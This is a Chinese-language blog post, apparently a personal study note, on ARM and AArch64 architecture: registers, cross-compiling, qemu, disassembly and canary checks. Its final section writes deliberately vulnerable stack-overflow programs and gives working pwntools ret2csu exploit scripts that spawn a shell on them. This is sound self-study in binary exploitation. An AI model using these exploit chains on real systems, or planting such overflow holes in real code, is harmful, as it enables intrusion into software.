<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          arm架构学习 - C12en
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

<meta name="generator" content="Hexo 7.3.0"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>C12EN</span>
  </a>
</div>
    <div id="menu" class="book-menu hide">
  
</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
  <div class="sidebar-toggle-inner"></div>
</div>

<script>
function add_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.add('show')  
}

function remove_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.remove('show')
}

function sidebar_toggle() {
    let sidebar_toggle = document.querySelector('.sidebar-toggle')
    let sidebar = document.querySelector('.book-sidebar')
    let content = document.querySelector('.off-canvas-content')
    if (sidebar_toggle.classList.contains('extend')) { // show
        sidebar_toggle.classList.remove('extend')
        sidebar.classList.remove('hide')
        content.classList.remove('extend')
    }
    else { // hide
        sidebar_toggle.classList.add('extend')
        sidebar.classList.add('hide')
        content.classList.add('extend')
    }
}
</script>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libncurses5-dev gcc-arm-linux-gnueabi build-essential synaptic gcc-aarch64-linux-gnu libc6-armhf-cross gcc-10-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>
<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p>与先前学过的inter指令集不同的是 arm采用的是精简指令集 虽然可以更快的执行指令 但是由于指令较少 因此在实现功能的时候会比inter更加繁琐<br>x86架构中 可以直接对内存数据进行操作 但是在arm架构中 只能通过寄存器来中转 先将内存中的数据存入寄存器再操作 这一点类似8086<br>arm架构下 又可以细分为armel和armhf 这是在32位下 至于64位 则都是采用armhf<br>二者的区别在于浮点运算上 他们在浮点运算时都会使用fpu寄存器 但是前者在传参的时候会使用普通寄存器 而后者在传参时则会使用fpu寄存器 所以armhf的浮点运算能力更强<br>ARM一共有37个寄存器 其中31个32位的通用寄存器 以及6个32位的状态寄存器<br>ARM处理器一共有7种模式<br>用户模式(usr)：ARM处理器正常的程序执行状态。非特权模式。<br>快速中断模式(fiq)：用于高速数据传输或通道处理。<br>外部中断模式(irq)：用于通用的中断处理。<br>管理模式(svc)：操作系统使用的保护模式。<br>数据访问终止模式(abt)：当数据或指令预取终止时进入该模式，可用于虚拟存储及存储保护。<br>系统模式(sys)：运行具有特权的操作系统任务。<br>定义指令中止模式(und)：当未定义的指令执行时进入该模式，可用于支持硬件协处理器的软件仿真。</p>
<h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><p>任意处理器模式下 可使用的寄存器包含15个通用寄存器 即R0-R14还有程序计数器PC以及一两个状态寄存器<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410242219483.png" alt="image.png"><br>R0寄存器可以用于存储临时值 也用于存储函数调用后的返回值<br>R0~R3寄存器就负责存储调用函数的参数<br>R7寄存器用于存储系统调用号 (这一点倒是比x86做的好 x86的rax寄存器又是存储函数返回值又是存储系统调用号的 可以通过read函数来控制rax寄存器的值 有机会实现任意函数调用 存在安全隐患<br>R11寄存器用来存储回溯信息 也可以作为局部变量 (这里的回溯信息有点疑惑是具体指什么 如果是用来返回父函数的 又和R14寄存器冲突 希望下面的研究能够了解一下<br>R13寄存器就是堆栈指针 指向堆栈的顶部<br>R14寄存器类似于rbp寄存器 存储调用函数的下一条指令 供子函数返回父函数<br>PC寄存器类似于rip寄存器 存储当前执行的目标地址 不过要特别注意的是 arm架构的pc寄存器会存储当前执行的目标地址+8 (这里具体的数值待研究 不清楚32位和64位架构是否都是8)</p>
<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>64位的arm架构这里介绍的是aarch64 属于armv8版本<br>aarch64一共有31个通用寄存器<br>这些寄存器既可以作为64位也可以作为32位使用<br>作为64位使用时表示为X0 作为32位使用时表示为W0(这里的0指的是0号寄存器 其他寄存器同理)<br>X0-X7作为参数和结果寄存器 可以作为临时寄存器以及存储函数调用过程中所需要的参数<br>X9-X15作为调用者保存的临时寄存器 调用者如果需要用到此类寄存器的值 要先将值存入栈上 再进行调用 因为在调用结束之后 不需要恢复寄存器的值<br>X19-X28作为被调用者保存的寄存器 这一个名称听起来拗口 实际可以理解为x64_86架构中的ebp寄存器 在进入子函数之后 会把原本的ebp存入栈上后 再将新的值存入寄存器 在返回父函数之前恢复ebp寄存器的值 这里指的就是这类寄存器<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250217112837508.png" alt="image.png"><br>特殊寄存器:<br>X29： 帧指针寄存器（FP）类似于32位的R11寄存器<br>X30： 链接寄存器（LR）类似于ebp寄存器<br>X31： 堆栈指针寄存器 (SP) 类似于esp寄存器</p>
<h1 id="编译并运行一个arm架构的二进制文件"><a href="#编译并运行一个arm架构的二进制文件" class="headerlink" title="编译并运行一个arm架构的二进制文件"></a>编译并运行一个arm架构的二进制文件</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;%s&quot;,&quot;test\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>任意准备一个c语言代码</p>
<h2 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h2><p>随后进行编译 并且通过qemu运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arm-linux-gnueabi-gcc -o test ./test.c</span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabihf/ ./test</span><br></pre></td></tr></table></figure>
<p>这里在使用qemu-arm时会出现两种选项<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250217085706799.png" alt="image.png"><br>qemu-arm使用小端字节序 armeb使用大端字节序<br>使用readelf指令可以查看得到编译出来的是32位的小端序arm架构<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250217092156339.png" alt="image.png"></p>
<h2 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aarch64-linux-gnu-gcc -o test ./test.c</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./test</span><br></pre></td></tr></table></figure>
<p>编译出来的是64位小端序arm架构<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250217092952085.png" alt="image.png"></p>
<h1 id="读懂简单程序的汇编"><a href="#读懂简单程序的汇编" class="headerlink" title="读懂简单程序的汇编"></a>读懂简单程序的汇编</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    setvbuf(stdin,0,2,0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	init();</span><br><span class="line">    printf(&quot;%s&quot;,&quot;test\n&quot;);</span><br><span class="line">    char buf[0x20];</span><br><span class="line">    read(0,buf,0x20);</span><br><span class="line">    puts(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一部分打算从一个简单的程序 来了解arm架构的汇编语句以及基本结构 先从32位开始</p>
<h2 id="32位-2"><a href="#32位-2" class="headerlink" title="32位"></a>32位</h2><p>使用gdb来动态调试 断点打在main函数的第一个语句<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250217100215302.png" alt="image.png"><br>可以得到fp寄存器即R11寄存器所说的用来存储回溯信息 实际上是存储fini数组的指针 负责终止程序<br>而lr寄存器即R14寄存器 其相当于x64架构中的ebp寄存器 这里进入init函数 看看到时R14寄存器的值是否为main函数<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250217100652280.png" alt="image.png"><br>此时的r14寄存器值为main函数 印证猜想 而r11寄存器的值为一个指针 存储r14寄存器的值 所以这里纠正一下上面的看法 r11寄存器存储的是指向返回地址的指针<br>回到main函数的汇编代码<br>ADD     R11, SP, #4 读取sp寄存器的值 使其加上4 结果存储在r11寄存器中<br>下一步SUB     SP, SP, #0x28 同理 读取sp寄存器的值 使其减去0x28 结果存储在sp寄存器中<br>这两步就相当于规划出当前的栈帧空间<br>接下来是canary保护机制的部分<br>LDR用于将目标地址的值存储至寄存器<br>STR用于将寄存器的值存储至目标地址<br>之所以要将canary的值先存储至R3寄存器再存储至栈帧上的对应地址 是因为前面说过arm架构和x64架构的不同点在于 arm架构需要通过寄存器来对内存数据进行操作<br>这里我个人觉得这一点在安全性上不如x64架构 多了一步寄存器的中转 就有存在漏洞利用的空间<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250217101920697.png" alt="image.png"><br>随后清空了r3的值 调用bl语句进入init函数 其负责控制程序执行流 跳转至对应地址或者是函数<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250217102918580.png" alt="image.png"><br>结果发现init函数并没有检查canary的操作 所以这里猜测 如果函数不涉及到栈帧内的数据变化 编译器就会作出优化 不在该函数中检查canary<br>下图是执行setvbuf函数的汇编部分 可以看到还是通过r3寄存器来中转读取指针中的值<br>猜测在arm架构中 r3寄存器就是作为内存数据和寄存器之间的媒介<br>这里调用函数用到的三个参数由r1，r2，r3寄存器存储<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250217103100003.png" alt="image.png"><br>在函数结束后 通过pop把存储在栈上的寄存器值恢复 POP     {R11,PC}<br>和x64的区别在于 这里是直接传给pc指针 不过在漏洞利用的时候估计没差<br>回到main函数 下图的三个函数调用过程就不复述了<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250217104229785.png" alt="image.png"><br>主要关注一下canary检验的部分和x64是否有什么不同<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250217104305417.png" alt="image.png"><br>将canary的值存储到r1寄存器中 将栈帧中的canary存储到r2寄存器中<br>EORS语句对r1和r2进行异或运算 如果结果为0则说明canary一致</p>
<h2 id="64位-2"><a href="#64位-2" class="headerlink" title="64位"></a>64位</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STP             X29, X30, [SP,#var_40]!</span><br></pre></td></tr></table></figure>
<p>main函数的第一句 stp指令用于把寄存器的值存储到内存地址上<br>这里将X29 X30寄存器的值依次存放到SP-#var_40处<br>但是可以注意到后面加上了! 这意味着当数据操作结束后 sp的变化将会保留 也可以将其拆分为两个指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STP             X29, X30, [SP,#var_40]</span><br><span class="line">SUB             SP,#var_40</span><br></pre></td></tr></table></figure>
<p>配合下一句mov 开头两句用于腾出栈帧空间</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADRP            X0, #__stack_chk_guard_ptr@PAGE</span><br></pre></td></tr></table></figure>
<p>adrp指令的作用是给寄存器赋值 但是不同于mov 其有一套自己的计算规则<br>首先将pc寄存器中的值以16进制表示 并且把后3位清零<br>再把后方的立刻数左移三位 然后将二者的结果相加赋值给寄存器<br>下面进行示例计算</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV PC,0xA123</span><br><span class="line">ADRP X0,3</span><br><span class="line"></span><br><span class="line">X0=0xA000+0x3000=0xD000</span><br></pre></td></tr></table></figure>
<p>下面这一段不难理解 就是canary保护机制 把canary的值存入到栈上<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250218141255649.png" alt="image.png"><br>和32位最大的区别就是多了ADRP这一条指令<br>跟着进入init函数 观察一下64位下是如何调用函数的<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250218141747783.png" alt="image.png"><br>依然是通过adrp和ldr的组合来获取stdout结构体的地址 接着利用X1 X2 X3三个寄存器存储函数调用需要的参数<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250218143501905.png" alt="image.png"><br>子函数结束后 返回父函数的操作值得留意一下<br>从对应内存地址中取出X29 X30寄存器的值 操作完成后再让sp寄存器向下移动0x10 也就是+0x10<br>随后执行ret指令 将返回地址弹到pc寄存器(后期更正 实际上执行完ret后 程序执行流会走向x30寄存器中的地址)<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250218144725117.png" alt="image.png"><br>同样来观察一下canary的检验部分<br>利用ADRP和LDR的组合把tlb结构体中的canary和栈上的canary分别存入到X2和X3寄存器<br>利用SUBS指令 执行X3-X2 并将结果存入到X3寄存器中<br>如果结果为0 说明一致 则不触发canary保护</p>
<h1 id="简单的尝试-初步漏洞利用"><a href="#简单的尝试-初步漏洞利用" class="headerlink" title="简单的尝试 初步漏洞利用"></a>简单的尝试 初步漏洞利用</h1><h2 id="64位-3"><a href="#64位-3" class="headerlink" title="64位"></a>64位</h2><p>编写如下测试程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    setvbuf(stdin,0,2,0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    init();</span><br><span class="line">    puts(&quot;ez attack&quot;);</span><br><span class="line">    char buf[0x20];</span><br><span class="line">    read(0,buf,0x100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关闭canary和pie保护机制<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250223122710126.png" alt="image.png"><br>编写如下exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">import base64</span><br><span class="line">context.arch = &quot;aarch64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"># io = process(&quot;./test&quot;)</span><br><span class="line">io = process([&quot;qemu-aarch64&quot;,&quot;-g&quot;, &quot;1234&quot;,&quot;-L&quot;,&quot;/usr/aarch64-linux-gnu/&quot;,&quot;./test&quot;])</span><br><span class="line">#io = remote(&quot;8.147.129.227&quot;,34825)</span><br><span class="line">elf = ELF(&quot;./test&quot;)</span><br><span class="line">#libc = ELF(&quot;libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;ez attack&quot;)</span><br><span class="line">payload = cyclic(0x20)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
<p>执行以后 在另外一个终端输入即可开始动态调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./test</span><br><span class="line">target remote:1234</span><br></pre></td></tr></table></figure>
<p>实际动调下来发现 aarch64的程序 返回地址是根据x30寄存器中的<br>也就是LDP             X29, X30, [SP+0x30+var_30],#0x30这一句<br>而要想覆盖到对应地址 发现其在buf数组的低地址处 也就是正常情况下无法覆盖到<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250309220843197.png" alt="image.png"><br>这个时候就需要用到x86学过的栈帧复用了 如果在main函数中调用vuln函数 vuln函数中存在栈溢出 就会溢出到main函数的栈帧中 这个时候就能覆盖到位于main栈帧的低地址处了 也就是通过vuln函数的栈溢出去控制main函数的程序执行流 将代码修改成下列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int key = 0;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    setvbuf(stdin,0,2,0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void vuln()&#123;</span><br><span class="line">    puts(&quot;ez attack&quot;);</span><br><span class="line">    char buf[0x20];</span><br><span class="line">    read(0,buf,0x100);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void backdoor()&#123;</span><br><span class="line">    if(key == 1)&#123;</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    init();</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后发现aarch64中没有pop push等栈帧操作指令 就算控制了程序执行流 也无法简单的操控寄存器的值 查阅了网上的资料 发现x86下的ret2csu这条链仍然存在 那么虽然麻烦一点 还是通过这个来控制寄存器吧<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250310110538957.png" alt="image.png"><br>这个示例代码其实有问题 控制返回地址直接到system那条指令就行了 根本不用绕过判断 但是为了尝试构造read 所以还是乖乖来吧哈哈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">import base64</span><br><span class="line">context.arch = &quot;aarch64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"># io = process(&quot;./test&quot;)</span><br><span class="line">io = process([&quot;qemu-aarch64&quot;,&quot;-L&quot;,&quot;/usr/aarch64-linux-gnu/&quot;,&quot;./test&quot;])</span><br><span class="line">#io = remote(&quot;8.147.129.227&quot;,34825)</span><br><span class="line">elf = ELF(&quot;./test&quot;)</span><br><span class="line">#libc = ELF(&quot;libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;ez attack&quot;)</span><br><span class="line">payload = cyclic(0x28)+p64(0x400828)+cyclic(0x8)+p64(0x400808)+p64(0)+p64(1)+p64(elf.got[&#x27;read&#x27;])+p64(0)+p64(0x41104c)+p64(0x10)+cyclic(0x8)+p64(0x40076C)</span><br><span class="line">io.send(payload)</span><br><span class="line"># pause()</span><br><span class="line">payload = p32(0x1)</span><br><span class="line">io.send(payload)</span><br><span class="line"># pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>最后成功控制执行流<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250310111250645.png" alt="image.png"></p>
<h2 id="32位-3"><a href="#32位-3" class="headerlink" title="32位"></a>32位</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int key = 0;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    setvbuf(stdin,0,2,0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void vuln()&#123;</span><br><span class="line">    puts(&quot;ez attack&quot;);</span><br><span class="line">    char buf[0x20];</span><br><span class="line">    read(0,buf,0x100);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void backdoor()&#123;</span><br><span class="line">    system(&quot;echo /bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    init();</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>32位的不同点在于 多了pop和push对栈帧的操作<br>不过在动态链接的情况下 仍然没有找到合适的gadget来控制r0 r1 r2<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250310150124301.png" alt="image.png"><br>好在发现ret2csu仍然存在(这也太万能了<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250310150406744.png" alt="image.png"><br>总体的逻辑还是比较简单 就是调用system之前先要执行一下system函数 否则got表里面没有真实地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">import base64</span><br><span class="line">context.arch = &quot;arm&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"># io = process(&quot;./test&quot;)</span><br><span class="line">io = process([&quot;qemu-arm&quot;,&quot;-L&quot;,&quot;/usr/arm-linux-gnueabihf/&quot;,&quot;./test&quot;])</span><br><span class="line">#io = remote(&quot;8.147.129.227&quot;,34825)</span><br><span class="line">elf = ELF(&quot;./test&quot;)</span><br><span class="line">#libc = ELF(&quot;libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;ez attack&quot;)</span><br><span class="line">payload = cyclic(0x24)+p32(0x105E8)</span><br><span class="line">payload += p32(0)+p32(elf.got[&#x27;read&#x27;])+p32(1)+p32(0)+p32(elf.bss(0x800))+p32(0x100)+p32(0)+p32(0x105C8)+cyclic(0x1c)+p32(0x10564)+cyclic(0x4)+p32(elf.sym[&#x27;main&#x27;])</span><br><span class="line">io.send(payload)</span><br><span class="line"># pause()</span><br><span class="line">payload = &quot;/bin/sh\x00&quot;</span><br><span class="line">io.send(payload)</span><br><span class="line"># pause()</span><br><span class="line">io.recvuntil(&quot;ez attack&quot;)</span><br><span class="line">binsh_addr = elf.bss(0x800)</span><br><span class="line">payload = cyclic(0x24)+p32(0x105E8)</span><br><span class="line">payload += p32(0)+p32(elf.got[&#x27;system&#x27;])+p32(1)+p32(binsh_addr)+p32(0)+p32(0)+p32(0)+p32(0x105c8)</span><br><span class="line">io.send(payload)</span><br><span class="line"># pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure
          class="avatar avatar-lg"
          data-initial="C"
          style="background-color: #3b4351;">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>C12en</div>
      <div>2024-10-10</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/iot/">iot</a>

      
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
